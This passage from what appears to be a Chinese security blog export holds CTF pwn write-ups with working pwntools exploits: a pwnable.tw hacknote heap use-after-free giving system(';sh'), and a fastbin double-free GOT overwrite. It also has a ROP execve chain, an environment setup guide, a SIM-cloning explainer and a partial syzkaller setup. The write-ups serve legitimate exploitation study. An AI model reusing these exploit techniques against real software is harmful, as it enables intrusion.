rtld_fini)\n\nmain函数代码如下：\n\n![](3177.png)\n\nsub_40EE70具体做了什么，看汇编代码太复杂，因此通过gdb调试看结果，使用gdb在401BED处下断点。\n\n![](3178.png)\n\n断点处信息如下：\n\n![](3179.png)\n\n执行完该函数之后，返回值会存放在RAX中。刚刚输入的是12345，返回值为0x3039，即12345的十六进制，因此该函数就是将输入的十进制数转换为一个十六进制地址。\n\n![](31710.png)\n\ninit是执行main函数之前会执行的，而fini是main执行完后执行的函数。\n\n因此考虑用任意地址写去覆盖fini的执行流程。如下是fini的汇编代码，在4B40F0处分别调用两个函数，且调用顺序是先fini_array[1]后fini_array[0]。那么只要将数组中的地址覆盖为我们想要的地址，就可以控制程序去执行了。\n\n![](31711.png)\n\n![](31712.png)\n\n## 3.3 利用\n\n获得以上信息之后，我们需要考虑，应当让fini_array的两个函数地址分别被覆盖为什么，才能达到利用的目的。利用就是get shell。在程序中使用strings搜索“/bin/sh”无果，因此一步完成get shell是不可能的，需要寻找其他方法。\n\nmain函数中可以实现任意地址写，如果将fini_array[1]的地址指向main，那么似乎就可以继续任意地址写。查看main函数，发现byte_4B9330为1时才能进入任意地址写操作，而我们第二次进入该函数时byte_4B9330已经为2了。怎么办呢？但是看看前面的int8，这是一个8位无符号整形，因此不用加多久，就整数溢出又变成1了。\n\n![](31713.png)\n\n那么怎么让main一直被调用呢？剩下的fini_array[0]就派上用场了。\n\n![](31714.png)\n![](31715.png)\n\n把fini_array[1]和fini_array[0]分别覆盖为main和调用array的fini函数，就可以实现如下循环。\n\n![](31716.png)\n\n这样就可以不限次数的任意地址写了。但是往哪里写，写什么内容呢？因为没有可写可执行段，因此直接把shellcode布置到内存空间中跳转执行是不可能的。那么就只能考虑ROP了，但不知道栈的位置，也没法去布置栈空间实现ROP。不过RIP是我们可以控制的，因此只要存在某一刻rsp会被泄露出来，那么只要在这一刻之前把对应地址空间布置好，那么就可以不断地ret然后把ROP链串起来啦。\n\n回到fini函数中，rbp原本的值被暂时存放在栈中，这里以rbp做临时寄存器，存放了fini_array的起始地址，此时rbp=0x4B40F0。\n\n![](31717.png)\n\n如果call指令能跳转到leave; ret; 这样的指令去，那么就可以控制rsp的地址了。如下是main函数中一条合适的指令：\n\n![](31718.png)\n\n```assembly\nrbp = 0x4B40F0\n\nleave:\nmov rsp,rbp          rsp = 0x4B40F0, rbp = 0x4B40F0\npop rbp                 rsp = 0x4B40F8, rbp = fini_array[0]\n\nret:\npop rip                  rsp = 0x4B4100, rip = fini_array[1]\n```\n\n这里必须让fini_array[1]为main，fini_array[0]为0x401C4B。这样rip被控制再去执行一次main函数，利用最后的ret，使rip从0x4B4100处执行，这里是我们提前布置好的空间。\n\n那么接下来的工作就是怎么布置0x4B4100以上的空间，通过ROP的方式获取shell。\n\n一条简单的获取shell的命令：\n\n![](31719.png)\n\n32位系统上通过int 80进行系统调用，64位系统上通过syscall指令实现。根据以上代码，需要控制rax为59（execve的系统调用号，0x3B），rdi为字符串“/bin/sh\\x00”的地址，rsi为0，rdx为0。因此rsp指向位置的ROP链应如此布置：\n\n```assembly\npop_rax\n0x3B\npop rdi\naddr_of_bin_sh\npop rsi\n0\npop rdx\n0\nsyscall\n```\n\n最后，字符串“/bin/sh\\x00”随便找一块可写的空间写上去就行。\n\n寻找gadget：\n\n![](31720.png)\n\n![](31721.png)\n\n![](31722.png)\n\n![](31723.png)\n\n![](31724.png)\n\n写exp：\n\n![](31725.png)\n\n执行获得flag：\n\n![](31726.png)\n\n## 3.4 记录\n\n### 3.4.1 64位汇编参数传递\n\nhttp://abcdxyzk.github.io/blog/2012/11/23/assembly-args/\n\nhttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack-intro-zh/\n\n\n\n","categories":["CTF"]},{"title":"pwnable.tw 之 hacknote","url":"/2020/03/01/hacknote/","content":"\n# 1 题目\n\n[题目链接](https://pwnable.tw/challenge/#5)\n\n![](hacknote-1.png)\n\n提供了一个二进制文件hacknote和一个库libc.so。\n\n# 2 分析\n\n首先分析一下这个题目的可执行程序。这是一个32bit的可执行程序，动态链接且去了符号表。该二进制程序符号表可读可写，开启了栈不可执行和canary保护，没有开启地址随机化。\n![](hacknote-2.png)\n执行以下试试。如下图，该程序提供了几个功能，添加/删除/打印笔记。我们用IDA看看这些功能的实现。\n![](hacknote-3.png)\n（1）add note功能\n![](hacknote-4.png)\nAdd操作只能执行5次。Sub_804862B函数如下，将a1+4这个地址处的指针取出，然后利用puts将该指针指向的内容进行打印。\n![](hacknote-5.png)\nChunk1和chunk2的关系如下图所示：\n![](hacknote-6.png)\n（2）delete note功能（这里存在漏洞点）\n![](hacknote-7.png)\n可以看到，delete函数将chunk2和chunk1释放掉后，并没有将指向各chunk的指针ptr[v1]置NULL，导致了悬空指针的产生。\n\n（3）print note功能\n![](hacknote-8.png)\n\n# 3 利用\n\n> 利用主要从两个方面去考虑（以第2节中chunk1和chunk2的图为例）：\n> 1、puts的内容就是chunk2中的内容，因此考虑将chunk2中的内容覆盖为我们想要的东西。如libc中某个函数的地址，这样我们就可以计算得到libc的基址，从而知道任意一个libc函数在动态执行时的地址。\n> 2、chunk1的的内容部分，前四个字节是一个函数指针，如果我们能控制这个chunk的前四个字节，就可以实现任意地址执行，劫持EIP。然而chunk1的内容并非我们能轻易改动的，因此需要结合glibc的堆管理机制中存在的漏洞，使chunk1的内容变得可控，且依然满足原来可执行的特性。从这里可以看出，我们需要两个不同的对象操作同一块内容，本质就是UAF。\n\n## 3.1 获取libc基址\n\n### 3.1.1 本地调试时libc的基址\n本地调试时，可以在gdb中方便地获取到libc的基址，为0xf7e07000。\n![](hacknote-9.png)\n### 3.1.2 本地动态调试，获取libc中main_arena结构体中top的地址\n**Unsorted bin有一个特性，就是链表中第一个chunk的fd和bk均指向main_arena结构体中的top位置。因此只要我们泄露出这个地址，加上题目提供的libc，就可以轻松计算出libc在实际场景中的基址了。**\n\n首先add一个64字节的note，再add一个10字节的note，然后delete掉第一个note。此举的目的是使第一个note中大于fastbin的堆块不被top chunk给合并掉，从而该堆块可以进入unsorted bin。\n![](hacknote-10.png)\n再次申请64字节的空间，堆管理器会把unsorted bin中的chunk再次分配给我们，此时index 2和index 0指向同一块堆内存区域。此时输入的内容只要不覆盖到unsorted bin中那个chunk的bk位置，就可以在成功分配后，调用print打该内存区域，获得main_arena中top的地址（地址是不可显示字符，所以显示乱码）。\n![](hacknote-11.png)\n![](hacknote-12.png)\n![](hacknote-13.png)\n### 3.1.3 远端的libc中top相对libc基址的偏移\n\nLibc库中的Malloc_trim函数中存在main_arena结构体，如下图位置：\n\n![](hacknote-14.png)\n查看main_arena在libc库中的偏移为0x001B0780。按照main_arena结构体与unsorted bin的关系（如下图），可知第一个被归档到unsorted bin的chunk，其fd与bk应当指向0x001B0780+0x30=0x001B07B0。\n\n![](hacknote-15.png)\n\n因此unsorted bin中返回的值，与libc基址的偏移为0x001B07B0。\n\n那么libc_base = addr(dongtai_top) – 0x001B07B0，因此只需要用3.1.2中的方法将top的地址泄露出来，就可以计算出libc的基址啦。\n\n[update]ps.另一种确切寻找top位置与main arena距离的方法：\n\n![](hacknote-0418.png)\n\n## 3.2 劫持EIP\n>思路：申请note时会建立chunk1（8byte）和chunk2（跟chunk1不同的大小就行），若再申请一个note，此时又会建立chunk1`和chunk2`。将这两个note删除后，chunk1和chunk1`会被链到同一大小（8byte）的fastbin上，chunk2和chunk2`会被链到其他大小的fastbin上。如果此时再申请一个8byte的note，就会将chunk1`和chunk1分别作为puts函数堆和内容堆。这个时候，chunk1被index 0和index2同时锁定。我们通过index 2 更改chunk1中的内容，然后通过index 0 去执行被替换掉的函数指针。\n\n具体操作如下：\n\n先申请两个大小为30的note，然后删除掉这两个note\n![](hacknote-16.png)\n再add一个大小为8的note，此时会将fastbin上大小为8的chunk进行分配。如下图，从上往下，第一个chunk已经被写入555了。\n![](hacknote-17.png)\n此时print 2得到如下结果。print 0 会报段错误，eip被覆盖成了555（即最后申请大小为8的堆时输入的content）。说明我们可以通过这种方式控制eip指针。\n![](hacknote-18.png)\n![](hacknote-19.png)\n\nEXP如下：\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\nmyelf = ELF('./hacknote')\nmylibc = ELF('./libc_32.so.6')\nio = remote('chall.pwnable.tw',10102)\n\ndef add_note(size,content):\n    io.recvuntil(\"choice :\")\n    io.sendline(\"1\")\n    io.recvuntil(\"size :\")\n    io.sendline(str(size))\n    io.recvuntil(\"Content :\")\n    io.sendline(content)\n\ndef del_note(index):\n    io.recvuntil(\"choice :\")\n    io.sendline(\"2\")\n    io.recvuntil(\"Index :\")\n    io.sendline(str(index))\n\ndef print_note(index):\n    io.recvuntil(\"choice :\")\n    io.sendline(\"3\")\n    io.recvuntil(\"Index :\")\n    io.sendline(str(index))\n\n\nadd_note(64,\"12\")\nadd_note(32,\"12\")\ndel_note(0)\nadd_note(64,\"45\")\nprint_note(2)\n\nlibc_addr = u32(io.recv(8)[4:8]) - 0x1b07b0\nsys_addr = libc_addr + mylibc.symbols['system']\n\n# add_note(8,\"12\")\n# add_note(8,\"34\")\n# del_note(3)\n# del_note(4)\ndel_note(0)\ndel_note(1)\nadd_note(8,p32(sys_addr)+\";sh\\x00\")\nprint_note(0)\nio.interactive()\n\n```\n\n# 4 记录\n\n## unsorted bin attack\n\nhttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/\n\n\n","tags":["heap","unsortedbin"],"categories":["CTF"]},{"title":"ctf堆入门 - paper","url":"/2020/02/23/paper/","content":"\n[题目文件链接](https://xuanxuanblingbling.github.io/assets/pwn/paper)\n\n# 1、寻找漏洞点\n\n拿到ELF后，先看看它的一些信息。\n- File查看文件格式\n- Checksec查看开启的安全编译选项\n- 运行一下看看都有哪些功能\n- 使用IDA看看伪代码，理解整个二进制程序的功并查找漏洞点。\n\n![](paper-1.png)\n\n64位程序，动态链接，没有去符号表，got表可写可读，开启栈不可执行和canary保护，没有做地址随机化。\n\n![](paper-2.png)\n\n程序提供两个功能，增加paper和删除paper，paper中可以存放指定大小的数据。\n\n![](paper-3.png)\n\nIDA查看程序实现，关注add_paper和delete_paper。\n\n![](paper-4.png)\n\nAdd paper中申请一块堆，然后存放数据。这个函数实现各项检查都做得很好，没发现漏洞点。\n\n![](paper-5.png)\n\nDelete paper中free掉指向堆的`link_list[index]`指针后，没有将该指针置NULL。导致一个悬空指针的产生《对几类危险的指针，见本文的记录——三类漏洞指针》。\n\n# 2、利用分析\n\n堆管理机制中，对于较小的堆块，采用fastbin的方式进行回收（本题中要求堆块小于0x80，这样free操作之后，该chunk会被链接到fastbin上）。本题中，申请的最大堆内存为1024Byte，所以要控制申请的堆大小不超过0x80。\n\n根据fastbin的单向链表及其他特性《见记录——fastbin attack》，我们需要通过double free在fastbin的链表中构造一个环（如下图）。然后申请一个与chunk1、chunk2相同大小的堆，此时会返回chunk1给线程使用，于是可以更改chunk1中的数据（如将“fd”位置处的值改为我们的目标地址）。下一次malloc时分配chunk2，再下一次分配时依然是chunk1，但此时main_arena已经指向目标地址处（如果目标地址合理）了。此时再malloc一次，就可以实现对该地址空间写任意值了。\n\n![](paper-6.png)\n\n这样接下来的目标就是，往哪里写才能getshell呢？\n\n要getshell就必须控制指针的执行流，使其执行我们构造的提权函数或者直接去执行该二进制文件中已有的提权函数。\n\n（1）寻找或构造提权函数（这里以ELF中自带提权函数为例）\n\n回到ELF文件，搜索“/bin/sh”或system函数，看是否存在这种后门，使利用更加简单。在string窗口中搜索“/bin/sh”，查看其引用gg，发现gg中会调用system(“/bin/sh”)。\n\n![](paper-7.png)\n\n![](paper-8.png)\n\n![](paper-9.png)\n\n至此，我们的提权函数就找到了！那么怎样才能让程序流乖乖地来执行我们的提权函数呢？\n\n（2）替换函数内容或替换函数指针（这里以替换函数指针为例）\n\t\n控制执行流的做法通常是将原本要执行的函数进行替换，替换函数指针或者替换掉函数内容。\n\n这里我们已经有了一个提权函数gg，且ELF并未开启地址随机化，那么首先想到的是控制某个函数指针指向gg。也就是说要把gg函数的地址0x00400943写到某个会被当做“函数指针”的地址0x12345678上去，这样当原本程序流从该0x12345678上取值并跳转执行时，就会执行gg函数了。\n\n![](paper-10.png)\n\n往哪里写这个gg函数地址呢？回到ELF文件，逆向查看伪源码，源码中并未定义有用的函数指针，但是栈上的返回地址可以作为考虑的一个选项。另外一种方法，就是去覆写got表了，具体做法是更改该got表的某个表项内地址为gg函数地址。这样当程序执行到该got表中函数（如printf、puts、gets等等）时，便会去执行我们的提权函数啦。\n\n那么最后，怎么获取到got表的地址以及该got条目的地址呢？由于本题的ELF未开启地址随机化，所以可直接通过IDA查看got表的起始地址以及各表项的具体地址。然而，对于开启随机化的ELF，就需要我们想办法去泄露got表地址了，这个方法在这篇文章中不予讨论。\n\n可以看到该ELF的got表条目如下，got表地址为0x00602000。\n\n![](paper-11.png)\n\n到这里利用思路基本明确了，就是将chunk1中fd的地址替换成got表中某一项（会执行到的函数）的值，然后将该项的值改成gg函数地址。\n\n那么这个got表中的地址需不需要满足什么条件呢？答案是必须的！main_arena把chunk从fastbin链表上卸下来的时候，会去检查该chunk中fd指向的另一chunk是否为合法chunk。合法chunk的特征是什么呢？就是目标chunk数据区之前的八个字节（64位下）必须是合法的size值，标志这个chunk的大小。Ps：其实只要这八个字节的低四字节满足就可以了。\n\n因此我们需要在上述got表中，寻找满足这种条件的地址。如下图，标记颜色的五个部分满足低四个字节为0x00000040或0x00000060，这可以是一个合法的size值。\n\n![](paper-12.png)\n\n但是选哪个作为目标地址呢，还需要结合got表项进行考虑。\n\n- 选0x602002处作为chunk的size部分\n- 选0x60201a处作为chunk的size部分\n- 选0x602032处作为chunk的size部分\n- 选0x60203a处作为chunk的size部分\n\n如果我们想覆写printf函数，即0x602040处的值，那么得使用0x602032处作为chunk的size部分。此时整个chunk的起始地址是0x60202a。可任意写的数据区从0x60203a开始。由于system函数在0x602038至0x60203f区间，因此0x60203a至0x60203f的值需要保持不变。需要将0x602040至0x602047的值改为gg函数地址。因此需要往0x60202a写入的内容为：\\x40\\x00\\x00\\x00\\x00\\x00+gg地址\n\n因为最终选择的chunk size（包含chunk头）为0x40，所以申请的堆内存大小必须是0x30。接下来可以写利用代码了。\n\n# 3、EXP\n\n```python\nfrom pwn import *\ncontext(os=\"linux\",arch=\"amd64\",log_level=\"debug\")\n\ne = ELF(\"./paper\")\nio = process(e.path)\n\ndef add_paper(index,length,content):\n    io.recv()\n    io.sendline(\"1\")\n    io.recv()\n    io.sendline(str(index))\n    io.recv()\n    io.sendline(str(length))\n    io.recv()\n    io.sendline(content)\n\ndef delete_paper(index):\n    io.recv()\n    io.sendline(\"2\")\n    io.recv()\n    io.sendline(str(index))\n    \nadd_paper(1,0x30,\"111\")\nadd_paper(2,0x30,\"222\")\n\ndelete_paper(1)\ndelete_paper(2)\ndelete_paper(1)\n\nadd_paper(3,0x30,p64(0x0060202a))\nadd_paper(4,0x30,\"444\")\nadd_paper(5,0x30,\"555\")\nadd_paper(6,0x30,\"\\x40\\x00\\x00\\x00\\x00\\x00\"+p64(e.symbols[\"gg\"]))\n\nio.recv()\nio.sendline(\"t\")\nio.interactive()\n\n```\n\n执行成功，getshell！\n\n![](paper-13.png)\n\n# 4、记录\n\n## 三类漏洞指针\n\n1、空指针：指向NULL的指针，若使用指针前未判断其是否为空，可导致程序崩溃。\n\n2、悬空指针：也称迷途指针，指向一段已释放的内存单元的指针，可导致UAF等漏洞。\n\n3、野指针：指向一段未初始化内存单元的指针。\n\n## fastbin attack\n\nhttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/\n\n\n## GOT表与PLT\n\nhttps://blog.csdn.net/qq_18661257/article/details/54694748\n\nhttps://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html\n\n## pwntools的使用\n\nhttps://www.cnblogs.com/Ox9A82/p/5728149.html\n\n\n\n# 5 新机搭建pwn环境\n\n由于这题必须在ubunut1804环境下利用，所以整个pwn的做题环境又需要重新搭一遍。为了以后再遇到这种情况时，可以迅速完成环境搭建，这里做一下记录。\n\n## 安装pwntools\n\n```shell\napt-get update\napt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential\npython3 -m pip install --upgrade pip\npython3 -m pip install --upgrade pwntools\n```\n\n## 安装checksec\n\n```shell\ngit clone https://github.com/slimm609/checksec.sh.git\ncd checksec.sh\nsudo cp checksec /usr/bin/checksec\n```\n\n新版使用方法：\n\n```shell\nchecksec --file=filename\n```\n\n## 安装pwndbg\n\n```shell\ngit clone https://github.com/pwndbg/pwndbg\ncd pwndbg\nsudo ./setup.sh\necho \"source /home/bling/pwndbg/gdbinit.py\" >> ~/.gdbinit\n```\n\n## 安装gef\n\nubuntu中下载gef.py不成功，因此跑去github直接下载源文件：\n\n[gef网址](https://github.com/hugsy/gef)\n\n```shell\n# 下载gef.py至/home/xxx用户根目录\n$ mv gef.py .gdbinit-gef.py\n$ echo \"source ~/.gdbinit-gef.py\" >> ~/.gdbinit\n```\n\n## 安装peda\n\n[peda网址](https://github.com/longld/peda)\n\n```shell\n$ git clone https://github.com/longld/peda.git ~/peda\n$ echo \"source ~/peda/peda.py\" >> ~/.gdbinit\n```\n\n## 安装ROPGadget\n\n```shell\nsudo pip install capstone\ngit clone https://github.com/JonathanSalwan/ROPgadget.git\ncd ROPgadget\nsudo python3 setup.py install\n```\n\n## 安装one_gadget\n\n```shell\n$ sudo apt -y install ruby\n$ sudo gem install one_gadget \n```\n\n## 安装LibcSearcher\n\n```shell\ngit clone https://github.com/lieanu/LibcSearcher.git\ncd LibcSearcher\nsudo python3 setup.py develop\n```\n\n## 安装32位libc\n\n方便运行32位程序，有两种方法：\n\n（1）\n\n```shell\nsudo dpkg --add-architecture i386\nsudo apt-get update\nsudo apt-get install libc6:i386\nsudo apt-get install libgtk2.0-0:i386\n```\n\n（2）\n\n```shell\n# 第一步，确认系统的架构\ndpkg --print-architecture  \n# 第二步，确认打开了多架构支持功能\npkg --print-foreign-architectures \n# 第三步，安装对应的32位库\nsudo apt-get dist-upgrade #这一步是更新所有的软件，如果你对新版本软件的需求不是那么迫切，可以不执行 \n#安装相关库  \nsudo apt-get install lib32z1 lib32ncurses5-dev #有的还需要32位stdc++库lib32stdc++6-4.8-dbg\n#安装gcc multilab  \nsudo apt-get install gcc-multilib g++-multilib  \n```\n\n","tags":["heap","fastbin"],"categories":["CTF"]},{"title":"SIM卡复制原理","url":"/2020/02/08/SIM/","content":"# SIM卡复制原理\n\n> GSM手机要想得到GSM系统的服务需要插入一张SIM卡。因为GSM系统是通过SIM卡来识别用户的，而不是基于手机来识别。\n>\n> 移动终端上必须装上sim卡才能使用，sim卡是整个**GSM系统**（全球移动通讯系统）中唯一确认用户身份的设备。\n\n## 常用缩写\n\nSIM，Subscriber Identification Module，客户识别模块（也称用户身份识别卡）。\n\nIMEI，国际移动设备识别码。由15位数字组成，每台手机对应一个IMEI，为全世界独一无二的。\n\nMEID，移动设备识别码。由14位十六进制字符组成。\n\nIMSI，国际移动用户识别码。通过IMSI可反查运营商、归属地、手机号码等信息。\n\n## sim卡的演进\n\n1991年，德国捷德公司开发了世界第一张SIM卡，大小是一个名片的大小。此类卡是**标准SIM卡**，也叫“原卡”。\n\n中国移动通信起步较晚，没赶上“原卡”时代，因此我们一开始接触到的是Mini SIM卡。再之后由于手机逐步小型化，2010年出现了Micro SIM卡，首先使用在苹果公司的产品上，如ipad、iphone4。2011年，苹果公司提出了更小的sim卡标准——Nano SIM卡。\n\n![](sim-4-kinds.png)\n\n以上的演进，说白了就是剪卡过程，并不是什么技术演进。\n\n但是Nano SIM卡还是占据较大的空间，在小型可穿戴设备上不实用，而且卡槽中放卡的方式不稳定。因此发展出了eSIM卡Embeded-SIM，直接嵌入到电路板上。\n\n但是eSIM仍然是一个硬件。现在还出现了依靠操作系统软件实现SIM卡功能的softSIM和vSIM，这样就完全告别实体SIM卡片了。\n\n伴随着网络变化，sim卡的变化：\n\n- SIM卡存在无法接入LTE/IMS网络的局限性\n- USIM可接入LTE/2G/3G网络，但不存储IMS网络相关的用户信息，因此接入VoLTE网络时，还需要通过终端导出IMS注册时所需要的用户码号信息。\n- ISIM卡是在USIM卡的基础上，增加了ISIM模块，专门用于存储IMS网络相关用户码号和归属地信息。可以通过读取ISIM模块中的信息直接接入VoLTE网络。\n\n## sim卡硬件特性\n\n> sim卡是一个装有微处理器的芯片卡。\n\n下面看一看实际的sim卡长什么样：\n\n![](sim-6-parts.png)\n\nsim卡通过这些铜制接口将卡内逻辑电路与移动终端连接起来。其中与移动终端连接的有如下六个触电：电源（Vcc），复位（RESET），时钟（CLK），接地端（GND），编程电压（VPP），数据I/O接口（Data）\n\nsim卡硬件内部包含如下五个模块：\n\n- 微处理器cpu，8位\n- 程序存储器ROM，3~8kbit\n- 工作存储器RAM，6~16kbit\n- 数据存储器EPROM，128~256kbit\n- 串行通信单元\n\n使用时，手机会向sim卡发送命令，sim卡根据标准规范执行后，给手机反馈执行结果。\n\n##　sim卡的功能\n\n1、存储数据：\n\n- 固定数据：这类数据在ME（Mobile Equipment）被出售之前由SIM卡中心写入，包括国际移动用户识别号（IMSI）、鉴权密钥（KI）等\n- 临时数据：指的是网络相关的的临时数据，如位置区域识别码（LAI）、移动用户暂时识别码（TMSI）、禁止接入的公共电话网代码等\n- 业务代码：如个人识别码（PIN）、解锁码（PUK）、计费费率等\n- 电话号码、短消息等用户记录\n\n（以上四类数据，除第一类只有专业部门能查阅和更新外，其他几类都是手机可查阅和更新的）\n\n2、PIN码保护\n\n3、用户身份鉴权\n\n4、SIM卡中的保密算法及密钥\n\n## sim卡认证\n\nSIM卡中没有存储本机号码，仅有IMIS号。当我们在营业厅申请并注册手机号时，运营商将手机号码与SIM卡的IMSI号、序列号以及鉴权密钥Ki做登记，储存在数据库里。\n\nSIM卡插入到手机中开机时，手机向SIM卡请求IMSI，然后把IMSI发送给运营商。运营商在数据库中查找是否存在这个IMSI并判断是否为合法用户，然后获得这个IMSI对应的手机号码和鉴权密钥Ki。\n\n运营商再生成一个随机数RAND，然后将该随机数发送给手机。手机接收到随机数RAND后，将该随机数RAND发送给SIM卡。SIM卡利用RAND和鉴权密钥Ki通过A3算法生成应答SRES，将SRES发送给手机，再由手机转发给运营商。运营商在本地利用RAND和对应的鉴权密钥Ki进行相同的运算，得到X-SRES，并比较SRES和X-SRES是否相同，相同的话就说明这个卡是合法的，允许其接入网络。\n\n上一步骤中，手机端收到RAND时，同时还会让SIM卡利用RAND和Ki计算出一个通信用的加密密钥Kc，计算时用的算法称之为A8。由于A3和A8接受的输入相同，因此实现者偷了个懒，用一个算法同时生成SRES和Kc。\n\n之后的通信过程中，使用加密密钥Kc和A5算法对通信内容进行加密。由于通信内容的加密量巨大，SIM卡无法快速处理如此多的加密需求，因此通信过程中的加密都是在手机上完成的。因此，所有的GSM手机都必须至少支持一种相同的A5算法，否则就无法漫游了。这时候运营商和设备商又偷了个懒，全世界目前都只用一种A5算法。这个算法的做法就是和Kc的8字节序列进行简单的循环XOR，再和报文序号做个减法。\n\n## sim卡复制\n\n从以上SIM卡认证原理中，我们知道IMSI和Ki是必不可少的，A3算法也必须知道。IMSI可以通过手机将其从SIM卡中读取出来，但是A3算法和鉴权密钥Ki是无法直接获取的，只能通过某种方法破解。\n\nA3算法一直被作为高级商业机密保护起来。但在1998年左右，有个人泄露了几页关于A3算法的文档到网络上。加州伯克利的几个教授拿到这个文档后，对照着SIM卡研究了一阵，最终将A3算法破解了。这个算法又叫做Comp128。\n\n怎么获取Ki呢？两个思路，一种是把SIM卡拆掉然后接到特殊设备上将Ki读取出来，另一种是利用Comp128去暴力破解、穷举。前一种方法就像用小刀在硬盘上刻操作系统一样不靠谱。后一种方法有一定的限制，SIM卡中的逻辑是一共只能查询2^16次左右，之后卡就不可用了。因此，研究者们只能在可接受的次数之内，通过构造特定明文和分析输出的密文来破解Ki的值。这种方法最终成功了。\n\n由于SIM复制设备越来越多，运营商们不得不发行新算法的卡，这个算法叫做Comp128 v2。这个算法目前为止还没被破解。\n\n\n# reference\nSIM卡实现原理：https://www.jianshu.com/p/8c9374f5e581\n\n4G LTE 网只能提供数据服务，不能承载语音通话，该怎么理解？https://www.zhihu.com/question/22365275\n\nSIM卡复制原理：https://cn.club.vmall.com/thread-2454925-1-1.html\n\n关于SIM和eSIM，看这一篇就够啦！https://zhuanlan.zhihu.com/p/47999705\n\nSIM卡中的A3、A5和A8算法：http://www.360doc.com/content/11/0913/22/3129476_148024343.shtml\n\n什么是伪基站？https://www.zhihu.com/question/36723973","categories":["通信"]},{"title":"syzkaller fuzz 工具的使用方法及实践实例","url":"/2019/10/26/syzkaller/","content":"\n\n\n[Syzkaller](https://github.com/google/syzkaller) 是google安全研究人员开发并维护的内核fuzz工具（2015年在github开源），由go语言编写，含少部分c/c++代码。支持多个操作系统内核，如linux、windows、darwin、openbsd等等，其对linux的支持最为全面。\n\n本篇文章将搭建syzkaller环境的过程记录下来，供之后参考。\n\n更新了一个视频：[内核fuzz工具Syzkaller使用方法介绍](https://www.bilibili.com/video/BV1gL4y1j7Cs?spm_id_from=333.999.0.0)\n\n# x86-64 linux虚拟机\n\n> fuzz对象是linux kernel，架构是x86-64，使用qemu模拟运行。\n\n## 编译syzkaller\n\n> 以syzkaller github上最新版为准，项目一直在更新，今天（2022年2月）编译的时候，跟我上次（2020年12月）编译有挺多地方都不一样了。\n\n[官方指导文档](https://github.com/google/syzkaller/blob/master/docs/linux/setup.md)\n\n1. 下载go语言编译器\n\n   ```bash\n   wget https://dl.google.com/go/go1.17.6.linux-amd64.tar.gz\n   tar -xf go1.17.6.linux-amd64.tar.gz\n   # 后面这两条命令建议设置到～/.bashrc文件中，通过source ~/.bashrc命令更新配置\n   export GOROOT=`pwd`/goroot\n   export PATH=$GOROOT/bin:$PATH\n   ```\n\n2. 下载并编译syzkaller\n\n   ```bash\n   git clone https://github.com/google/syzkaller\n   cd syzkaller\n   make\n   # 如果fuzz目标是arm 64位，则需指定交叉编译器，如下\n   # make CC=aarch64-linux-gnu-g++ TARGETARCH=arm64\n   ```\n\n   编译过程中遇到一个问题，是因为虚拟机内存给少了，给到12G内存后不再报错。\n\n编译完成后，在syzkaller目录下会出现一个bin目录，里面就是我们后面需要用到的二进制。如下是我编译的结果：\n\n```bash\n~/syzkaller$ tree ./bin\n./bin\n├── linux_amd64\n│   ├── syz-execprog\n│   ├── syz-executor\n│   ├── syz-fuzzer\n│   └── syz-stress\n├── syz-db\n├── syz-manager\n├── syz-mutate\n├── syz-prog2c\n├── syz-repro\n├── syz-runtest\n├── syz-sysgen\n└── syz-upgrade\n```\n\n## 编译linux内核\n\n1. 以linux 5.14内核为例，先将源码下载到本地\n\n   ```bash\n   git clone --branch v5.14 git://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git\n   ```\n\n2. 生成默认配置文件\n\n   ```bash\n   cd linux\n   make defconfig\n   make kvm_guest.config\n   ```\n\n3. 更改.config文件\n\n   为了fuzz效率，以下内核配置必须打开。更多可选配置见[Linux kernel configs](https://github.com/google/syzkaller/blob/master/docs/linux/kernel_configs.md)\n\n   ```bash\n   # Coverage collection.\n   CONFIG_KCOV=y         # must\n   \n   # Debug info for symbolization.\n   CONFIG_DEBUG_INFO=y\n   \n   # Memory bug detector\n   CONFIG_KASAN=y\n   CONFIG_KASAN_INLINE=y\n   \n   # Code coverage works better when KASLR Is disabled \n   # CONFIG_RANDOMIZE_BASE is not set\n   \n   # 可选\n   CONFIG_KCOV_INSTRUMENT_ALL=y\n   CONFIG_KCOV_ENABLE_COMPARISONS=y\n   CONFIG_DEBUG_FS=y\n   \n   CONFIG_DEBUG_KMEMLEAK=y\n   ```\n\n4. 重新生成配置文件并编译\n\n   ```bash\n   make olddefconfig\n   make -j4\n   ```\n\n5. 漫长的等待后，就能在目录下看到`vmlinux` (kernel binary) 和 `bzImage` (packed kernel image)\n\n   ```bash\n   ~$ ls linux/vmlinux\n   linux/vmlinux\n   ~$ ls linux/arch/x86/boot/bzImage\n   linux/arch/x86/boot/bzImage\n   ```\n\n\n## 配置qemu虚拟机\n\n1. 安装qemu\n\n使用`sudo apt install qemu`或下载最新qemu源码编译。前者的版本较低，有些特性不支持。建议使用后者。\n\n2. 生成image\n\n使用debootstrap构建linux启动镜像：\n\n```shell\nsudo apt-get install debootstrap\ncd $IMAGE/\nwget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.sh\nchmod +x create-image.sh\n./create-image.sh\n\n# 可以使用./create-image.sh -h查看更多帮助选项\n```\n\n完成之后目录内容如下：\n\n```shell\n~/s_image$ ll\ntotal 502072\ndrwxr-xr-x  3 bling bling       4096 1月   9 09:03 ./\ndrwxr-xr-x 25 bling bling       4096 1月   9 00:45 ../\ndrwxr-xr-x 21 root  root        4096 1月   9 02:25 chroot/\n-rwxr-xr-x  1 bling bling       6360 1月   9 00:13 create-image.sh*\n-rw-------  1 bling bling       1675 1月   9 09:03 stretch.id_rsa\n-rw-r--r--  1 bling bling        398 1月   9 09:03 stretch.id_rsa.pub\n-rw-r--r--  1 bling bling 2147483648 1月   9 09:04 stretch.img\n```\n\n3. 启动虚拟机\n\n启动虚拟机试试\n\n```shell\nqemu-system-x86_64 -m 2G -smp 2 -kernel /home/bling/linux/arch/x86/boot/bzImage -append \"console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0\" -drive file=/home/bling/qemu-img/stretch.img,format=raw -net user,hostfwd=tcp:127.0.0.1:10021-:22 -net nic,model=e1000 -enable-kvm -nographic -pidfile vm.pid 2>&1 | tee 